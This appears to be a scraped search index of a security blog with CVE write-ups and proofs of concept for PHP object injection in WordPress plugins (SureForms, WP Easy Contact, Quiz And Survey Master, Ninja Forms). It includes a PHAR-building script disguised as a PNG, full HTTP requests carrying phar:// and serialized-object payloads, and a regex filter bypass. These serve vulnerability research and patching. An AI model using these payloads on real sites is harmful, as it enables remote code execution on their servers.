Content-Length: 730 Origin: http://localhost Connection: keep-alive Cookie: wp-settings-time-3=1763365761 Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin X-PwnFox-Color: blue Priority: u=0 ------geckoformboundary951e0587d59c442ebcc7cae9dcac2221 Content-Disposition: form-data; name=\"sureforms_form_submit\" d3b9273370 ------geckoformboundary951e0587d59c442ebcc7cae9dcac2221 Content-Disposition: form-data; name=\"_wp_http_referer\" /2025/11/19/form-testing/ ------geckoformboundary951e0587d59c442ebcc7cae9dcac2221 Content-Disposition: form-data; name=\"form-id\" 123 ------geckoformboundary951e0587d59c442ebcc7cae9dcac2221 Content-Disposition: form-data; name=\"srfm-sender-email-field\" ------geckoformboundary951e0587d59c442ebcc7cae9dcac2221 Content-Disposition: form-data; name=\"srfm-input-7469d29b-lbl-VGV4dCBGaWVsZA-text-field\" testing ------geckoformboundary951e0587d59c442ebcc7cae9dcac2221-- Submit form from Unauthenticated user\rThe response returns several fields such as status and submission id. The name delete_entry_files refers to deleting an entry, so let’s set a breakpoint at the start of the function and try deleting an entry. Debugger when entry is deleted\rContinue debugging Value of $value\rWe see $value is attacker-controlled. $value needs to be an array so it won’t be skipped by continue and so file_exists() can be invoked. To make $value an array, submit a field whose name ends with []: ------geckoformboundary951e0587d59c442ebcc7cae9dcac2221 Content-Disposition: form-data; name=\"srfm-input-7469d29b-lbl-VGV4dCBGaWVsZA-text-field[]\" testing Value of $value\r","date":"2025-11-19","objectID":"/posts/2025-11-19-cve-2025-6742/:4:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-6742 Analysis \u0026 POC","uri":"/posts/2025-11-19-cve-2025-6742/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rAfter debugging, we can see the execution flow to the sink: graph TD\rA[\"Client submit form\"] --\u003e B[\"Admin delete entry\"]\rB --\u003e C[\"WordPress hook: admin_init\"]\rC --\u003e D[\"handle_entry_actions\"]\rD --\u003e E[\"Entries_List_Table::handle_entry_status()\"]\rE -- $action=delete --\u003e F[\"Entries_List_Table::delete_entry_files()\"]\rF --\u003e G{\"$value is array\"}\rG -- Yes --\u003e H[\"call file_exists( $file_path )\"] --\u003e L[\"RCE: PHAR Deserialization\"]\rG -- No --\u003e K[\"continue\"]\rgraph TD\rA[\"Client submit form\"] --\u003e B[\"Admin delete entry\"]\rB --\u003e C[\"WordPress hook: admin_init\"]\rC --\u003e D[\"handle_entry_actions\"]\rD --\u003e E[\"Entries_List_Table::handle_entry_status()\"]\rE -- $action=delete --\u003e F[\"Entries_List_Table::delete_entry_files()\"]\rF --\u003e G{\"$value is array\"}\rG -- Yes --\u003e H[\"call file_exists( $file_path )\"] --\u003e L[\"RCE: PHAR Deserialization\"]\rG -- No --\u003e K[\"continue\"]\rgraph TD\rA[\"Client submit form\"] --\u003e B[\"Admin delete entry\"]\rB --\u003e C[\"WordPress hook: admin_init\"]\rC --\u003e D[\"handle_entry_actions\"]\rD --\u003e E[\"Entries_List_Table::handle_entry_status()\"]\rE -- $action=delete --\u003e F[\"Entries_List_Table::delete_entry_files()\"]\rF --\u003e G{\"$value is array\"}\rG -- Yes --\u003e H[\"call file_exists( $file_path )\"] --\u003e L[\"RCE: PHAR Deserialization\"]\rG -- No --\u003e K[\"continue\"]\rgraph TD\rA[\"Client submit form\"] --\u003e B[\"Admin delete entry\"]\rB --\u003e C[\"WordPress hook: admin_init\"]\rC --\u003e D[\"handle_entry_actions\"]\rD --\u003e E[\"Entries_List_Table::handle_entry_status()\"]\rE -- $action=delete --\u003e F[\"Entries_List_Table::delete_entry_files()\"]\rF --\u003e G{\"$value is array\"}\rG -- Yes --\u003e H[\"call file_exists( $file_path )\"] --\u003e L[\"RCE: PHAR Deserialization\"]\rG -- No --\u003e K[\"continue\"]\r","date":"2025-11-19","objectID":"/posts/2025-11-19-cve-2025-6742/:5:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-6742 Analysis \u0026 POC","uri":"/posts/2025-11-19-cve-2025-6742/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rUse an admin account to create a form and insert it into a post Create a PHP file create_phar.php with the following code: \u003c?php // Define class Evil with a property and __wakeup function class Evil { // Property command contains the system command to be executed public $command = \"ls /\"; // __wakeup() is triggered when this object is unserialized public function __wakeup(): void { // When unserialized, execute the command in $command and terminate program die(system($this-\u003ecommand)); } } // Create a new PHAR file named poc.phar $phar = new Phar('poc.phar'); // Begin writing PHAR contents $phar-\u003estartBuffering(); // Add a fake entry named test.png with content \"text\" $phar-\u003eaddFromString('test.png', 'text'); // Set PHAR stub beginning with PNG magic bytes to disguise it as an image, // then __HALT_COMPILER() to end execution $phar-\u003esetStub(\"\\x89PNG\\r\\n\\x1a\\n\u003c?php __HALT_COMPILER(); ?\u003e\"); // Write metadata containing an Evil object $phar-\u003esetMetadata(new Evil()); // Finish writing and flush to file $phar-\u003estopBuffering(); Create the PHAR file poc.phar by running: php --define phar.readonly=0 create_phar.php Info\rphar.readonly is a directive in PHP (Phar extension configuration). By default its value is 1 (readonly) and PHAR files cannot be created. To generate PHAR files, disable readonly using phar.readonly=0 or configure it in php.ini. Rename poc.phar to poc.png since file uploads typically only accept images rather than .phar Upload poc.jpg using the Media Editor. Take note of its upload path in wp-content/uploads. Resend the form submission request: POST /wp-json/sureforms/v1/submit-form?_locale=user HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0 Accept: application/json, */*;q=0.1 Accept-Language: en-US,en;q=0.7,vi;q=0.3 Accept-Encoding: gzip, deflate, br Referer: http://localhost/2025/11/19/form-testing/ X-WP-Nonce: 2c506366a5 Content-Type: multipart/form-data; boundary=----geckoformboundary951e0587d59c442ebcc7cae9dcac2221 Content-Length: 775 Origin: http://localhost Connection: keep-alive Cookie: wp-settings-time-3=1763365761 Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin X-PwnFox-Color: blue Priority: u=0 ------geckoformboundary951e0587d59c442ebcc7cae9dcac2221 Content-Disposition: form-data; name=\"sureforms_form_submit\" d3b9273370 ------geckoformboundary951e0587d59c442ebcc7cae9dcac2221 Content-Disposition: form-data; name=\"_wp_http_referer\" /2025/11/19/form-testing/ ------geckoformboundary951e0587d59c442ebcc7cae9dcac2221 Content-Disposition: form-data; name=\"form-id\" 123 ------geckoformboundary951e0587d59c442ebcc7cae9dcac2221 Content-Disposition: form-data; name=\"srfm-sender-email-field\" ------geckoformboundary951e0587d59c442ebcc7cae9dcac2221 Content-Disposition: form-data; name=\"srfm-input-7469d29b-lbl-VGV4dCBGaWVsZA-text-field[]\" phar://../../../wp-content/uploads/2025/11/poc.png ------geckoformboundary951e0587d59c442ebcc7cae9dcac2221-- When the admin deletes the entry RCE when admin deletes entry\rWarning After testing multiple PHP versions, I found that: The function file_exists() only works for PHAR exploitation on versions \u003c=7.4 Some other functions usable for PHAR Deserialization exploitation: copy file_exists file_get_contents file_put_contents file fileatime filectime filegroup fileinode filemtime fileowner fileperms filesize filetype fopen is_dir is_executable is_file is_link is_readable is_writable lstat mkdir parse_ini_file readfile rename rmdir stat touch unlink ","date":"2025-11-19","objectID":"/posts/2025-11-19-cve-2025-6742/:6:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-6742 Analysis \u0026 POC","uri":"/posts/2025-11-19-cve-2025-6742/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rThe PHP Object Injection vulnerability in SureForm \u003c= 1.7.3 originates from using file_exists() and unlink() directly on a user-controlled path without scope constraints. Although the plugin does not contain a POP chain by default, if additional plugins or themes installed in the environment contain a POP chain, attackers may escalate exploitation to deleting files, reading sensitive data, or even executing arbitrary code (RCE). The 1.7.4 patch handles the issue by normalizing and restricting valid file paths into the upload directory, eliminating the exploitation vector. ","date":"2025-11-19","objectID":"/posts/2025-11-19-cve-2025-6742/:0:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-6742 Analysis \u0026 POC","uri":"/posts/2025-11-19-cve-2025-6742/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways\rThe vulnerability originates from interacting with filesystem paths derived directly from uncontrolled user input. Using only file_exists() can lead to PHAR deserialization on PHP versions ≤7.4. Although the plugin has no built-in POP chain, typical WordPress environments host many plugins → high likelihood of chainability. The patch adds path normalization, upload directory restrictions, and avoids directly interacting with filesystem paths. File operation functions always pose exploitation risk if user inputs are not strongly validated. ","date":"2025-11-19","objectID":"/posts/2025-11-19-cve-2025-6742/:0:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-6742 Analysis \u0026 POC","uri":"/posts/2025-11-19-cve-2025-6742/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rDeserialization WordPress SureForm Plugin \u003c= 1.7.3 is vulnerable to a high priority PHP Object Injection ","date":"2025-11-19","objectID":"/posts/2025-11-19-cve-2025-6742/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-6742 Analysis \u0026 POC","uri":"/posts/2025-11-19-cve-2025-6742/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress WP Easy Contact Plugin.","date":"2025-11-18","objectID":"/posts/2025-11-18-cve-2025-53572/","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/posts/2025-11-18-cve-2025-53572/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rThe Deserialization of Untrusted Data vulnerability in emarket-design WP Easy Contact allows Object Injection. This issue affects WP Easy Contact: from n/a to 4.0.1. CVE ID: CVE-2025-53572 Vulnerability Type: PHP Object Injection Affected Versions: \u003c= 4.0.1 Patched Versions: 4.0.2 CVSS severity: High (8.1) Required Privilege: Unauthenticated Product: WordPress WP Easy Contact Plugin ","date":"2025-11-18","objectID":"/posts/2025-11-18-cve-2025-53572/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/posts/2025-11-18-cve-2025-53572/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging Virtual Machine Docker Plugin Version – WP Easy Contact 4.0.1 – vulnerable 4.0.2 – patched Diff Tool (diff) → Meld or any diff tool. ","date":"2025-11-18","objectID":"/posts/2025-11-18-cve-2025-53572/:2:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/posts/2025-11-18-cve-2025-53572/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause\rThe vulnerability originates from allowing attackers to instantiate arbitrary objects from input → PHP Object Injection. $widg_arr = explode(\"-\", $div_id); $mywidg = new $widg_arr[1](); The patch adds a whitelist and sanitizes the input → only valid classes can be instantiated, removing the vulnerability. Changes in the patch\r","date":"2025-11-18","objectID":"/posts/2025-11-18-cve-2025-53572/:3:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/posts/2025-11-18-cve-2025-53572/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\rThe plugin registers an Ajax action for unauthenticated users (wp_ajax_nopriv): add_action('wp_ajax_nopriv_emd_get_widg_pagenum', 'emd_get_widg_pagenum'); When a request is sent to /wp-admin/admin-ajax.php with action=emd_get_widg_pagenum, the callback emd_get_widg_pagenum is executed: function emd_get_widg_pagenum(){ $response = false; $pageno = isset($_GET['pageno']) ? (int) $_GET['pageno'] : 1; $div_id = isset($_GET['div_id']) ? sanitize_text_field($_GET['div_id']) : ''; $myapp = isset($_GET['app']) ? sanitize_text_field($_GET['app']) : ''; if(!empty($div_id)){ $pids = Array(); $front_ents = emd_find_limitby('frontend', $myapp); $widg_arr = explode(\"-\",$div_id); $mywidg = new $widg_arr[1](); ... } } For the line new $widg_arr[1]() to run, the condition if(!empty($div_id)) must be satisfied, meaning the GET parameter div_id has to be provided. $widg_arr[1] is taken from the array obtained after explode on the value of $_GET['div_id']. For example, if div_id=abc-Class, then $widg_arr[1] equals Class, allowing arbitrary object instantiation through new $widg_arr[1](). ","date":"2025-11-18","objectID":"/posts/2025-11-18-cve-2025-53572/:4:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/posts/2025-11-18-cve-2025-53572/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph TD\rA[\"Client sends GET /wp-admin/admin-ajax.php?action=emd_get_widg_pagenum\u0026div_id=abc-Class\"]\r--\u003e B[\"WordPress hook: wp_ajax_nopriv_emd_get_widg_pagenum\"]\rB --\u003e C[\"Callback: emd_get_widg_pagenum()\"]\rC --\u003e D{\"Check if div_id is not empty\"}\rD -- True --\u003e E[\"explode('-', div_id) → $widg_arr\"]\rE --\u003e F[\"Instantiate object: new $widg_arr[1]()\"]\rgraph TD\rA[\"Client sends GET /wp-admin/admin-ajax.php?action=emd_get_widg_pagenum\u0026div_id=abc-Class\"]\r--\u003e B[\"WordPress hook: wp_ajax_nopriv_emd_get_widg_pagenum\"]\rB --\u003e C[\"Callback: emd_get_widg_pagenum()\"]\rC --\u003e D{\"Check if div_id is not empty\"}\rD -- True --\u003e E[\"explode('-', div_id) → $widg_arr\"]\rE --\u003e F[\"Instantiate object: new $widg_arr[1]()\"]\rgraph TD\rA[\"Client sends GET /wp-admin/admin-ajax.php?action=emd_get_widg_pagenum\u0026div_id=abc-Class\"]\r--\u003e B[\"WordPress hook: wp_ajax_nopriv_emd_get_widg_pagenum\"]\rB --\u003e C[\"Callback: emd_get_widg_pagenum()\"]\rC --\u003e D{\"Check if div_id is not empty\"}\rD -- True --\u003e E[\"explode('-', div_id) → $widg_arr\"]\rE --\u003e F[\"Instantiate object: new $widg_arr[1]()\"]\rgraph TD\rA[\"Client sends GET /wp-admin/admin-ajax.php?action=emd_get_widg_pagenum\u0026div_id=abc-Class\"]\r--\u003e B[\"WordPress hook: wp_ajax_nopriv_emd_get_widg_pagenum\"]\rB --\u003e C[\"Callback: emd_get_widg_pagenum()\"]\rC --\u003e D{\"Check if div_id is not empty\"}\rD -- True --\u003e E[\"explode('-', div_id) → $widg_arr\"]\rE --\u003e F[\"Instantiate object: new $widg_arr[1]()\"]\r","date":"2025-11-18","objectID":"/posts/2025-11-18-cve-2025-53572/:5:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/posts/2025-11-18-cve-2025-53572/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rCreate a test class inside wp-config.php: class ObjectInjection { public $command; public function __construct(){ $this-\u003ecommand = $_GET['cmd']; } function __destruct(){ die(system($this-\u003ecommand)); } } Send the request with payload: GET /wp-admin/admin-ajax.php?action=emd_get_widg_pagenum\u0026div_id=abc-ObjectInjection\u0026cmd=ls+/ Result\r","date":"2025-11-18","objectID":"/posts/2025-11-18-cve-2025-53572/:6:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/posts/2025-11-18-cve-2025-53572/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rThe vulnerability in WP Easy Contact \u003c= 4.0.1 stems from unsafe input handling, allowing direct object instantiation from user-controlled data. By abusing the div_id parameter, attackers can achieve PHP Object Injection leading to arbitrary code execution. The patch in 4.0.2 fixes the issue by introducing a whitelist and sanitizing input, ensuring only valid classes can be instantiated. This clearly demonstrates how unsafe deserialization can become a critical exploit vector, especially when combined with unauthenticated access. ","date":"2025-11-18","objectID":"/posts/2025-11-18-cve-2025-53572/:0:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/posts/2025-11-18-cve-2025-53572/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways\rUnauthenticated attack surface: Triggered via wp_ajax_nopriv, no login required. Root cause: Directly using user input (new $widg_arr[1]()), no validation. Fix strategy: Apply whitelist and sanitize to restrict valid classes. Best practice: Always validate and sanitize input, avoid unsafe deserialization, and restrict object instantiation from untrusted sources. ","date":"2025-11-18","objectID":"/posts/2025-11-18-cve-2025-53572/:0:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/posts/2025-11-18-cve-2025-53572/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rDeserialization WordPress WP Easy Contact Plugin \u003c= 4.0.1 is vulnerable to a high priority PHP Object Injection ","date":"2025-11-18","objectID":"/posts/2025-11-18-cve-2025-53572/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/posts/2025-11-18-cve-2025-53572/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Quiz And Survey Master Plugin.","date":"2025-11-17","objectID":"/posts/2025-11-17-cve-2025-49401/","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-49401 Analysis \u0026 POC","uri":"/posts/2025-11-17-cve-2025-49401/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rThis plugin performs unserialize on user-supplied data through a form field, which may allow unauthenticated users to perform PHP Object Injection if a suitable gadget exists in the system. CVE ID: CVE-2025-49401 Vulnerability Type: PHP Object Injection Affected Versions: \u003c= 10.2.5 Patched Versions: 10.2.6 CVSS severity: High (9.8) Required Privilege: Unauthenticated Product: WordPress Quiz And Survey Master Plugin ","date":"2025-11-17","objectID":"/posts/2025-11-17-cve-2025-49401/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-49401 Analysis \u0026 POC","uri":"/posts/2025-11-17-cve-2025-49401/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging Virtual Machine Docker Plugin Version – Quiz And Survey Master: 10.2.5 – vulnerable 10.2.6 – patched Diff Tool (diff) → Meld or any diff tool. ","date":"2025-11-17","objectID":"/posts/2025-11-17-cve-2025-49401/:2:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-49401 Analysis \u0026 POC","uri":"/posts/2025-11-17-cve-2025-49401/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause\rThe vulnerability originates from the use of maybe_unserialize(). Although some checks exist, this mechanism is still not fully secure. if ( preg_match( '/^(O|C):\\d+:/', $qmn_sanitize_random_ids ) ) { return ''; } if ( is_serialized( $qmn_sanitize_random_ids ) ) { $unserialized = maybe_unserialize( $qmn_sanitize_random_ids ); if ( ! is_object( $unserialized ) \u0026\u0026 ! is_resource( $unserialized ) ) { return $unserialized; } } The patch replaces maybe_unserialize() with unserialize() and blocks all object creation using ['allowed_classes' =\u003e false] → effectively preventing PHP Object Injection. Patch changes\r","date":"2025-11-17","objectID":"/posts/2025-11-17-cve-2025-49401/:3:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-49401 Analysis \u0026 POC","uri":"/posts/2025-11-17-cve-2025-49401/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\rAfter reviewing the logic of qsm_questions_answers_shortcode_to_text(), I noticed repeated appearances of keywords like question and answer, indicating this function is likely directly tied to question/answer processing. Instead of tracing step-by-step, I decided to search for related functions dealing with question and answer, while debugging inside qsm_questions_answers_shortcode_to_text(). If this method didn’t work, I would perform a deeper trace. After some digging, I created a post with a custom question. Creating quiz with the plugin block\rAccess the post and submit an answer. Debugger at qsm_questions_answers_shortcode_to_text\rThe debugger stopped at qsm_questions_answers_shortcode_to_text(). Current request: POST /wp-admin/admin-ajax.php HTTP/1.1 ... The function qmn_sanitize_random_ids_data() will call maybe_unserialize(). But first, this condition must be met: if ( ! empty( $_POST['quiz_answer_random_ids'] ) ) We can edit one of the fields in the request and replace it with quiz_answer_random_ids. - Content-Disposition: form-data; name=\"currentuserTimeZone\" - Asia/Bangkok + Content-Disposition: form-data; name=\"quiz_answer_random_ids\" + payload The value of qmn_sanitize_random_ids will be the input passed to maybe_unserialize(). ![Debug](Value of qmn_sanitize_random_ids) function qmn_sanitize_random_ids_data( $qmn_sanitize_random_ids ) { if ( is_string( $qmn_sanitize_random_ids ) ) { if ( preg_match( '/^(O|C):\\d+:/', $qmn_sanitize_random_ids ) ) { return ''; } if ( is_serialized( $qmn_sanitize_random_ids ) ) { $unserialized = maybe_unserialize( $qmn_sanitize_random_ids ); if ( ! is_object( $unserialized ) \u0026\u0026 ! is_resource( $unserialized ) ) { return $unserialized; } } } return $qmn_sanitize_random_ids; } Before maybe_unserialize is invoked, we need to bypass the only filter: if ( preg_match( '/^(O|C):\\d+:/', $qmn_sanitize_random_ids ) ) { return ''; } The regex checks whether the string begins with O: or C:. For example: O:8:\"stdClass\":... Unfortunately, the defense is weak. Serialized payloads can begin with a: (array), and arrays may contain O: or C: to trigger object deserialization. The plugin registers an AJAX endpoint for unauthenticated users (nopriv): add_action( 'wp_ajax_nopriv_qmn_process_quiz', array( $this, 'ajax_submit_results' ) ); When a request hits /wp-admin/admin-ajax.php with action=qmn_process_quiz, the callback ajax_submit_results() is executed. It then calls submit_results(), JSON-encodes the output, and echoes it. echo wp_json_encode( $this-\u003esubmit_results( $options, $data ) ); submit_results() calls display_results_text(). $results_pages = $this-\u003edisplay_results_text( $qmn_quiz_options, $qmn_array_for_variables ); display_results_text() calls generate_pages(). return QSM_Results_Pages::generate_pages( $response_data ); generate_pages() applies the filter previously registered: mlw_qmn_template_variable_results_page. echo apply_filters( 'mlw_qmn_template_variable_results_page', $page, $response_data ); Many callbacks registered\rMany callbacks are registered for this filter, but the relevant one here is mlw_qmn_variable_question_answers, which directly triggers the function qsm_questions_answers_shortcode_to_text() analyzed earlier. ","date":"2025-11-17","objectID":"/posts/2025-11-17-cve-2025-49401/:4:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-49401 Analysis \u0026 POC","uri":"/posts/2025-11-17-cve-2025-49401/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph TD\rA[\"POST /wp-admin/admin-ajax.php\"] -- action=qmn_process_quiz\u0026other_post_data --\u003e B[\"wp_ajax_nopriv_qmn_process_quiz\"]\rB --\u003e C[\"ajax_submit_results()\"]\rC --\u003e D[\"submit_results()\"]\rD --\u003e E[\"display_results_text()\"]\rE --\u003e F[\"generate_pages()\"]\rF -- apply filter mlw_qmn_template_variable_results_page --\u003e G[\"mlw_qmn_variable_question_answers()\"]\rG --\u003e H[\"qsm_questions_answers_shortcode_to_text()\"]\rH --\u003e K{\" ! empty( $_POST['quiz_answer_random_ids'] )\"}\rK -- true --\u003e L[\"qmn_sanitize_random_ids_data()\"] --\u003e M{\"preg_match( '/^(O|C):\\d+:/', $qmn_sanitize_random_ids )\"}\rM -- true --\u003e N[\"return ''\"]\rM -- false --\u003e V[\"maybe_unserialize\"] --\u003e W[\"RCE\"]\rgraph TD\rA[\"POST /wp-admin/admin-ajax.php\"] -- action=qmn_process_quiz\u0026other_post_data --\u003e B[\"wp_ajax_nopriv_qmn_process_quiz\"]\rB --\u003e C[\"ajax_submit_results()\"]\rC --\u003e D[\"submit_results()\"]\rD --\u003e E[\"display_results_text()\"]\rE --\u003e F[\"generate_pages()\"]\rF -- apply filter mlw_qmn_template_variable_results_page --\u003e G[\"mlw_qmn_variable_question_answers()\"]\rG --\u003e H[\"qsm_questions_answers_shortcode_to_text()\"]\rH --\u003e K{\" ! empty( $_POST['quiz_answer_random_ids'] )\"}\rK -- true --\u003e L[\"qmn_sanitize_random_ids_data()\"] --\u003e M{\"preg_match( '/^(O|C):\\d+:/', $qmn_sanitize_random_ids )\"}\rM -- true --\u003e N[\"return ''\"]\rM -- false --\u003e V[\"maybe_unserialize\"] --\u003e W[\"RCE\"]\rgraph TD\rA[\"POST /wp-admin/admin-ajax.php\"] -- action=qmn_process_quiz\u0026other_post_data --\u003e B[\"wp_ajax_nopriv_qmn_process_quiz\"]\rB --\u003e C[\"ajax_submit_results()\"]\rC --\u003e D[\"submit_results()\"]\rD --\u003e E[\"display_results_text()\"]\rE --\u003e F[\"generate_pages()\"]\rF -- apply filter mlw_qmn_template_variable_results_page --\u003e G[\"mlw_qmn_variable_question_answers()\"]\rG --\u003e H[\"qsm_questions_answers_shortcode_to_text()\"]\rH --\u003e K{\" ! empty( $_POST['quiz_answer_random_ids'] )\"}\rK -- true --\u003e L[\"qmn_sanitize_random_ids_data()\"] --\u003e M{\"preg_match( '/^(O|C):\\d+:/', $qmn_sanitize_random_ids )\"}\rM -- true --\u003e N[\"return ''\"]\rM -- false --\u003e V[\"maybe_unserialize\"] --\u003e W[\"RCE\"]\rgraph TD\rA[\"POST /wp-admin/admin-ajax.php\"] -- action=qmn_process_quiz\u0026other_post_data --\u003e B[\"wp_ajax_nopriv_qmn_process_quiz\"]\rB --\u003e C[\"ajax_submit_results()\"]\rC --\u003e D[\"submit_results()\"]\rD --\u003e E[\"display_results_text()\"]\rE --\u003e F[\"generate_pages()\"]\rF -- apply filter mlw_qmn_template_variable_results_page --\u003e G[\"mlw_qmn_variable_question_answers()\"]\rG --\u003e H[\"qsm_questions_answers_shortcode_to_text()\"]\rH --\u003e K{\" ! empty( $_POST['quiz_answer_random_ids'] )\"}\rK -- true --\u003e L[\"qmn_sanitize_random_ids_data()\"] --\u003e M{\"preg_match( '/^(O|C):\\d+:/', $qmn_sanitize_random_ids )\"}\rM -- true --\u003e N[\"return ''\"]\rM -- false --\u003e V[\"maybe_unserialize\"] --\u003e W[\"RCE\"]\r","date":"2025-11-17","objectID":"/posts/2025-11-17-cve-2025-49401/:5:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-49401 Analysis \u0026 POC","uri":"/posts/2025-11-17-cve-2025-49401/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rUse the plugin to create a post with a quiz using the QSM block. Submit the form and intercept the request via Burp. Modify the value of quiz_answer_random_ids to contain the serialized payload: a:1:{i:0;O:15:\"ObjectInjection\":1:{s:7:\"command\";s:4:\"ls /\";}} Resend the request. Tip To test locally, create a class with a magic method __wakeup() or __destruct() in wp-config.php: class ObjectInjection { public $command; function __destruct(){ die(system($this-\u003ecommand)); } } ","date":"2025-11-17","objectID":"/posts/2025-11-17-cve-2025-49401/:6:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-49401 Analysis \u0026 POC","uri":"/posts/2025-11-17-cve-2025-49401/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rThe CVE-2025-49401 vulnerability is caused by unsafe input handling through maybe_unserialize(), allowing unauthenticated attackers to provide serialized payloads to trigger PHP Object Injection. The filtering based on preg_match only blocks payloads beginning with O: or C: but fails against serialized arrays containing objects. Combined with an open AJAX endpoint (wp_ajax_nopriv_qmn_process_quiz), the payload moves through several layers before being unserialized, ultimately enabling arbitrary code execution (RCE) if a suitable gadget chain exists. The patch uses unserialize(..., ['allowed_classes' =\u003e false]), completely eliminating object creation and fully mitigating the vulnerability. ","date":"2025-11-17","objectID":"/posts/2025-11-17-cve-2025-49401/:0:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-49401 Analysis \u0026 POC","uri":"/posts/2025-11-17-cve-2025-49401/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways\rmaybe_unserialize() is inherently dangerous when handling user input in WordPress. Manual regex filtering is insufficient to stop deserialization attacks — attackers can wrap malicious objects inside arrays. Unauthenticated AJAX endpoints are highly sensitive attack surfaces. allowed_classes = false is the safest mitigation when object deserialization is not needed. The more complex the plugin, the higher the chance of gadget chains leading to RCE. ","date":"2025-11-17","objectID":"/posts/2025-11-17-cve-2025-49401/:0:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-49401 Analysis \u0026 POC","uri":"/posts/2025-11-17-cve-2025-49401/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rDeserialization WordPress Quiz And Survey Master Plugin \u003c= 10.2.5 is vulnerable to a high priority PHP Object Injection ","date":"2025-11-17","objectID":"/posts/2025-11-17-cve-2025-49401/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-49401 Analysis \u0026 POC","uri":"/posts/2025-11-17-cve-2025-49401/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Ninja Forms Plugin.","date":"2025-11-14","objectID":"/posts/2025-11-14-cve-2025-9083/","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-9083 Analysis \u0026 POC","uri":"/posts/2025-11-14-cve-2025-9083/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rThis plugin performs an unserialize operation on data submitted by users through form fields. This allows unauthenticated users to perform PHP Object Injection if a suitable gadget exists within the system. CVE ID: CVE-2025-9083 Vulnerability Type: PHP Object Injection Affected Versions: \u003c= 3.11.0 Patched Versions: 3.11.1 CVSS severity: High (9.8) Required Privilege: Unauthenticated Product: WordPress Ninja Forms Plugin ","date":"2025-11-14","objectID":"/posts/2025-11-14-cve-2025-9083/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-9083 Analysis \u0026 POC","uri":"/posts/2025-11-14-cve-2025-9083/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging Virtual Machine Docker Plugin Version – Ninja Forms: 3.11.0 – vulnerable 3.11.1 – patched Diff Tool (diff) → Meld or any diff tool. ","date":"2025-11-14","objectID":"/posts/2025-11-14-cve-2025-9083/:2:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-9083 Analysis \u0026 